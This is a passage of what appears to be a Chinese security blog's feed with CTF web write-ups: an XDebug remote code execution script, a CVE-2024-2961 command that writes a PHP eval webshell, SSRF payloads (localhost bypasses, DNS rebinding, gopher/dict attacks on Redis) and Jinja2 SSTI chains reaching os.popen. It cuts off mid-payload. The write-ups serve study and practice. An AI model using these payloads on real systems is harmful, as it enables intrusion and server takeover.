data.find(b&#x27;\x00&#x27;)</span><br><span class="line">            if eop &lt; 0:</span><br><span class="line">                break</span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+1:]</span><br><span class="line"></span><br><span class="line">        if len(blocks) &gt;= 4:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return blocks[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def trigger(url):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    try:</span><br><span class="line">        session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (&#x27;0.0.0.0&#x27;, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(10)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(5)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\x00&#x27;]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(&#x27;[+] Recieve data: &#x27; + data.decode())</span><br><span class="line">    g = re.search(rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;, data, re.I)</span><br><span class="line">    if not g:</span><br><span class="line">        print(&#x27;[-] No result...&#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    data = g.group(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode())</span><br><span class="line">    except binascii.Error:</span><br><span class="line">        print(&#x27;[-] May be not string result...&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们访问<code>/index.php?XDEBUG_SESSION_START=phpstorm</code>时，返回包会多出一个<code>Set-Cookie</code>，内容是<code>XDEBUG_SESSION=phpstorm;...</code>。</p><p>执行payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t 【靶机url】/index.php -c &#x27;shell_exec(&quot;ls&quot;);&#x27; -l 9000</span><br></pre></td></tr></table></figure><h2 id="敏感⽂件读取"><a href="#敏感⽂件读取" class="headerlink" title="敏感⽂件读取"></a>敏感⽂件读取</h2><p>第⼀种解法，有出过题的，⼤部分都是采⽤<a href="https://github.com/CTF-Archives/ctf-docker-template%E8%BF%99%E2%BE%A5%E2%BE%AF%E7%9A%84%E6%A8%A1%E7%89%88%E3%80%82%E2%BC%80%E8%88%AC%E5%87%BA%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B8%BA%E4%BA%86%E2%BD%85%E4%BE%BF%EF%BC%8C%E4%B8%8D%E5%8E%BB%E4%BF%AE%E6%94%B9dockerfile%E2%BD%82%E4%BB%B6%EF%BC%8C%E9%83%BD%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%AE%B9%E5%99%A8%E5%86%85%E4%BF%AE%E6%94%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8Dcommit%E2%BD%A3%E6%88%90%E9%95%9C%E5%83%8F%E3%80%82">https://github.com/CTF-Archives/ctf-docker-template这⾥⾯的模版。⼀般出题过程中，为了⽅便，不去修改dockerfile⽂件，都会直接在容器内修改，然后再commit⽣成镜像。</a> ⾥⾯的php出题模版中，有⼀个容器启动命令⽂件docker-entrypoint.sh。可以看到该命令⽂件在容器初始化后就会被删掉。但是在提交⽣成镜像后，由镜像⽣成容器⼜需要运⾏该⽂件。因此有的出题者为了⽅便可能就不删除该⽂件，这时候就可以碰碰运⽓，看看出题者有没有把这个⽂件删掉。没有删掉，就能够获取路径</p><p>因此，在这⾥直接尝试读取docker-entrypoint.sh⽂件，可以发现该⽂件将flag变量输⼊到了&#x2F;f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jcl kej1wlkcj1lkwej1lkcwjellag。</p><h2 id="CVE-2024-296"><a href="#CVE-2024-296" class="headerlink" title="CVE-2024-296"></a>CVE-2024-296</h2><p><a href="https://github.com/kezibei/php-filter-iconv">GitHub - kezibei&#x2F;php-filter-iconv</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://1.1.1.1:8080/index.php &quot;echo &#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure><p>访问1.php执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.SSRF漏洞&lt;br&gt;2.php7.1.33CVE-2019-11043，远程代码执行漏洞&lt;br&gt;该漏洞位于PHP-FPM模块的env_path_info函数，在特定的nginx + php-fpm配置中，web用户就可能会进行代码执行。该漏洞需要在nginx.conf中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://1768161086.github,io/2025/03/10/SSRF/"/>
    <id>http://1768161086.github,io/2025/03/10/SSRF/</id>
    <published>2025-03-10T10:10:24.000Z</published>
    <updated>2025-03-13T12:21:12.328Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a><strong>相关函数和类</strong></h3><p><a href="https://so.csdn.net/so/search?q=gethostbyname&spm=1001.2101.3001.7020">gethostbyname</a>() 返回主机名 hostname 对应的 IPv4 互联网地址。</p><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中<br>readfile()：输出一个文件的内容<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用<br>fopen()：打开一个文件文件或者 URL<br>PHP原生类SoapClient在触发反序列化时可导致SSRF</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h3><p>1.让服务端去访问相应的网址</p><p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p><p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p><p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p><p>5.攻击内网应用程序（利用跨协议通信技术）</p><p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p><p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shellhttp&#x2F;s协议：探测内网主机存活</p><h3 id="Ⅰ、SSRF攻击点"><a href="#Ⅰ、SSRF攻击点" class="headerlink" title="Ⅰ、SSRF攻击点"></a>Ⅰ、SSRF攻击点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>curl_init()</code>：初始curl会话</li><li><code>curl_setopt()</code>：会话设置</li><li><code>curl_exec()</code>：执行curl会话,获取内容</li><li><code>curl_close()</code>：会话关闭</li></ul><h3 id="Ⅱ、gopher协议"><a href="#Ⅱ、gopher协议" class="headerlink" title="Ⅱ、gopher协议"></a>Ⅱ、gopher协议</h3><p>通过gopher协议，将请求体用url编码后<strong>加上任意字符</strong>,<em>一般是下划线</em>，接上gopher的url即可执行GET、POST请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_[stream]</span><br></pre></td></tr></table></figure><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">或者使用 file 伪协议去读取文件</span><br><span class="line">post: url=file:///var/www/html/index.php 查看源码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>绕过local host和127.0.0.1</p><p>payload:ip地址<strong>进制转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">十进制整数：url=http://2130706433/flag.php</span><br><span class="line">十六进制：url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制：url=http://0177.0.0.1/flag.php</span><br><span class="line">十六进制整数：url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><p>other</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php或者http://127.255.255.254/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h4 id="web354-过滤01"><a href="#web354-过滤01" class="headerlink" title="web354-过滤01"></a>web354-过滤01</h4><p>在自己的域名中添加一条A记录指向 127.0.0.1</p><p>或者使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure><h2 id="web357-在线DNS重绑定"><a href="#web357-在线DNS重绑定" class="headerlink" title="web357-在线DNS重绑定)"></a>web357-在线<a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a>)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123; </span><br><span class="line">$ip = gethostbyname($x[&#x27;host&#x27;]); </span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;; </span><br><span class="line">if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; </span><br><span class="line">    die(&#x27;ip!&#x27;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    die(&#x27;scheme&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数解析：</p><p>gethostbyname() 返回主机名 hostname 对应的 IPv4 互联网地址。</p><p>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</p><p>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</p><p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</p><p>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p><p>不能有内网ip，所以填一个公网ip:1.1.1.23</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://7f000001.01010117.rbndr.us/flag.php</span><br></pre></td></tr></table></figure><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123; </span><br><span class="line">    echo file_get_contents($url); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则表达式的意思是以<a href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><h2 id="web359利用gopher无密码注入mysql"><a href="#web359利用gopher无密码注入mysql" class="headerlink" title="web359利用gopher无密码注入mysql"></a>web359利用gopher无密码注入mysql</h2><p>登陆界面找到一个隐藏的攻击点:type:’hidden’对其进行SSRF攻击</p><p>详细请看另一篇文章</p><p>将 _ 下划线后面的内容再进行一次 url 编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）</p><p>抓包后将编码出来的数据（尾端去除%0a）以post方式传入returl,访问上传的文件执行命令获得flag</p><h2 id="web360-打redis"><a href="#web360-打redis" class="headerlink" title="web360-打redis"></a>web360-打redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库</p><p>手动尝试：</p><p>url传入dict:&#x2F;&#x2F;127.0.0.1:6379</p><p>dict探测 redis 默认端口是否存活：返回+OK 说明redis接收到了</p><p>设置本地数据库存放地址：可以看到返回一个+OK</p><p>使用上述方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br></pre></td></tr></table></figure><p> 传入一句话木马，默认生成shell.php文件</p><p>需要把 _ 后边的字符串再进行一次 url 编码，post传入url</p><p>最后访问shell.php</p><p>另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php</span><br></pre></td></tr></table></figure><p>被过滤可用十六进制绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:set:shell:&quot;&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SSRF基础&quot;&gt;&lt;a href=&quot;#SSRF基础&quot; class=&quot;headerlink&quot; title=&quot;SSRF基础&quot;&gt;&lt;/a&gt;SSRF基础&lt;/h3&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSTI</title>
    <link href="http://1768161086.github,io/2025/03/07/SSTI/"/>
    <id>http://1768161086.github,io/2025/03/07/SSTI/</id>
    <published>2025-03-07T09:24:13.603Z</published>
    <updated>2025-03-31T05:06:04.742Z</updated>
    
    <content type="html"><![CDATA[<h5 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">变量块 &#123;&#123;&#125;&#125;    用于将表达式打印到模板输出</span><br><span class="line">注释块 &#123;##&#125;    注释</span><br><span class="line">控制块    &#123;%%&#125;    可以声明变量，也可以执行语句</span><br><span class="line">行声明    ##        可以有和&#123;%%&#125;相同的效果</span><br></pre></td></tr></table></figure><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__class__           查看对象所在的类</span><br><span class="line">__mro__             查看继承关系和调用顺序，返回元组</span><br><span class="line">__base__            返回基类</span><br><span class="line">__bases__           返回基类元组</span><br><span class="line">__subclasses__()    返回子类列表</span><br><span class="line">__init__            调用初始化函数，可以用来跳到__globals__</span><br><span class="line">__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典</span><br><span class="line">__builtins__        返回内建内建名称空间字典</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）        都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1        get传参</span><br><span class="line">request.values.x1      所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           post传参    (Content-Type:a/b)</span><br><span class="line">request.json         post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">int()        将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()        将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()        将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()        将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()        把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()    把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()        截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()    计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()    字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)    替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)    截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()    删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e    转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()        禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()        将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()    将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()        将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()        返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()        返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()        返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)    格式化字符串。比如：&#123;&#123;&quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()    返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()        返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()        返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)    如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()    返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.随便找一个内置类对象用__class__拿到他所对应的类</span><br><span class="line">2.用__bases__拿到基类（&lt;class &#x27;object&#x27;&gt;）</span><br><span class="line">3.用__subclasses__()拿到子类列表</span><br><span class="line">4.在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数</span><br></pre></td></tr></table></figure><h2 id="web361-无过滤"><a href="#web361-无过滤" class="headerlink" title="web361-无过滤"></a>web361-无过滤</h2><p>?name&#x3D;49</p><p>回显49，说明执行了语句</p><p>查找可以利用的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>接下来就是要命令执行</p><p>比如我们要选择eval函数，就要找到包含 <code>eval</code> 函数的类，这里我知道eval函数在 <code>&lt;class &#39;warnings.catch_warnings&#39;&gt;里</code></p><p>利用脚本查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">for i in tqdm(range(233)):</span><br><span class="line">    url = &#x27;http://9f7c273f-592e-4f44-bec2-fcc399bdf13a.challenge.ctf.show/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[&#x27; + str(</span><br><span class="line">        i) + &#x27;]&#125;&#125;&#x27;</span><br><span class="line">    r = requests.get(url=url).text</span><br><span class="line">    if (&#x27;warnings.catch_warnings&#x27; in r):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>输出185</p><p>然后利用利用.<strong>init</strong>.<strong>globals</strong>来找os类中的。init初始化，globals全局查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>之后搜索eval可发现built-in function即<strong>内置函数</strong>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure><p>因此无法通<code>__gloables__[&#39;eval&#39;]</code>直接调用内置函数，python的内置函数和对象全局可用，但他们不是函数内部的一部分。因此要在内部访问内置函数eval或os，需要通过<code>__builtins__</code>来访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls 